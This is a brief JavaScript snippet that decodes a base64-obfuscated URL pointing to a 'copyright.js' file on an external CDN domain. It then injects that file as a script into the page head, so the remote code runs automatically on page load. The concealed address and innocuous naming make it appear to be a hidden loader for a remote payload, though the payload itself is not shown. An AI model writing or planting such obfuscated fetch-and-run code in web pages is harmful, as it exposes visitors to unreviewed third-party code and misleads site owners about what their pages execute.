(function () {
  function loadSCA() {
    const e = ["aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw=="];
    const s = document.createElement("script");
    const u = atob(e[0]);
    s.src = u;
    s.async = true;
    document.head.appendChild(s);
  }
  loadSCA();
})();
